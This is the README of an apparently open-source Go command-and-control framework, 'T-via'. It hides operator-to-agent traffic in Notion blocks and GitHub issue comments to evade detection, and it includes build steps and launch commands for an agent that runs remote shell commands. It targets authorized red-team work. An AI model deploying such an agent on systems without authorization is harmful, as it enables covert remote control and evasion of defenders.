<p align="center">
  <h1 align="center">T-via</h1>
  <h4 align="center">Modular C2 Framework using Notion and GitHub as Communication Channels</h4>
</p>

<p align="center">

  <a href="https://opensource.org/licenses/MIT">
    <img src="https://img.shields.io/badge/license-MIT-_red.svg">
  </a>

  <a href="https://github.com/RaghavanSV/T-via">
    <img src="https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg">
  </a>

  <a href="https://github.com/RaghavanSV/T-via/issues">
    <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat">
  </a>

</p>

<p align="center">
  <a href="#introduction">Introduction</a> •
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#project-structure">Project Structure</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

# Introduction

**T-via** is a lightweight, stealthy Command and Control (C2) framework written in Go. It empowers operators to manage remote agents by leveraging reputable third-party platforms like **Notion** and **GitHub** as communication backends. By tunneling commands through these services, T-via blends in with legitimate web traffic, making detection significantly more difficult.

# Features

- **Multi-Channel Communication**:
  - **Notion Backend**: Uses Notion pages and paragraph blocks for command/response syncing.
  - **GitHub Backend**: Leverages GitHub Issue Comments for stealthy C2 communication.
- **Stealth & Reliability**:
  - **Block Tracking**: Advanced logic to track specific Notion block IDs and GitHub comment IDs, preventing re-execution of commands.
  - **Configurable Polling**: Custom polling intervals to avoid rate limits and reduce noise.
- **Robust Agent**:
  - Error-resistant type asserting for API responses.
  - Character limit handling (e.g., Notion's 2000-char block limit).
  - Executing commands via system shell and capturing combined output.

# Installation

Ensure you have [Go](https://go.dev/dl/) installed on your system.

### 1. Clone the repository
```sh
git clone https://github.com/RaghavanSV/T-via.git
cd T-via
```

### 2. Build the Operator
```sh
go build -o operator.exe operator.go
```

### 3. Build the Client (Agent)
```sh
cd client
go build -o client.exe client.go
```

# Usage

### Notion Mode

1. **Setup**: Create a Notion Integration and a Page. Share the page with the integration.
2. **Start Operator**:
   ```sh
   .\operator.exe notion -token <INTEGRATION_TOKEN> -page <PAGE_ID> -interval 5
   ```
3. **Start Client**:
   ```sh
   .\client.exe notion <INTEGRATION_TOKEN> <PAGE_ID> 10
   ```

### GitHub Mode

1. **Setup**: Create a GitHub Repository and a Personal Access Token (PAT). Create an Issue.
2. **Start Operator**:
   ```sh
   .\operator.exe github -owner <OWNER> -repo <REPO_NAME> -token <PAT> -interval 5
   ```
3. **Start Client**:
   ```sh
   .\client.exe github <OWNER> <REPO_NAME> <PAT> <ISSUE_NUMBER> 10
   ```

# Project Structure

```
T-via/
├── operator.go       # Operator console (CLI Interface)
├── go.mod            # Project dependencies
├── client/           # Agent source code
│   └── client.go     # Agent logic for Notion & GitHub
└── README.md         # This file
```

# Disclaimer

Use this project under your own responsibility! This tool is intended for **authorized penetration testing and security research only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author is not responsible for any misuse of this project.

# License

This project is under [MIT](https://opensource.org/licenses/MIT) license

Copyright © 2025, *RaghavanSV*
